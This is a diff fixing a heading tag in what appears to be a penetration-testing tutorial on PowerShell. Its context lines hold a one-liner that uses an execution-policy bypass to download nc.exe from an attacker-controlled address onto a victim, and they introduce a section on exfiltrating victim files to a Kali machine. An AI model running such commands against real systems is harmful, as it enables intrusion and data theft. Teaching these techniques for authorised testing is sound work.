@@ -45,7 +45,7 @@ Along with PowerShell, remembe that there are sometimes restrictions placed onto
 powershell -c "-exec bypass mkdir c:\temp & Invoke-WebRequest -URI http://10.10.10.2/nc.exe -OUTFILE c:\temp\nc.exe"
 {% endhighlight %}
 
-<h1>Exfiltrating Data</h2>
+<h1>Exfiltrating Data</h1>
 
 This is a method where you use a HTML server running on your Kali Linux attacking machine, where PowerShell can upload a file from a victim machine to your Kali. First, we will need to create a PHP page to process our upload request. This can be found here:
 
